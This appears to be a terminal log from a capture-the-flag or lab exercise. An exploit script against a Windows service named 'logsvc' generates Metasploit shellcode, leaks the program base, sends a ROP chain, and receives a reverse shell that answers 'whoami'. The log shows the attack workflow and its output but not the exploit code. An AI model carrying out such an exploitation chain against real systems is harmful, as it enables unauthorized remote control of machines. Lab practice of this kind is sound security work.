```
spaghettiPolice@z:~/# python3 xpl.py 
[*] generating shellcode, takes a bit
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of python file: 2210 bytes
Saved as: sc.py
[+] Opening connection to 10.10.74.149 on port 4141: Done
[*] leaking program base
[*] program base: 0x7ff6b28f0000
[*] building ropchain
[*] sending payload
[*] starting listener
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.74.149 on port 50405
[*] Switching to interactive mode
Microsoft Windows [Version 10.0.19045.3208]
(c) Microsoft Corporation. All rights reserved.

C:\logsvc>$ whoami
whoami
armee\logsvc

C:\logsvc>$
```
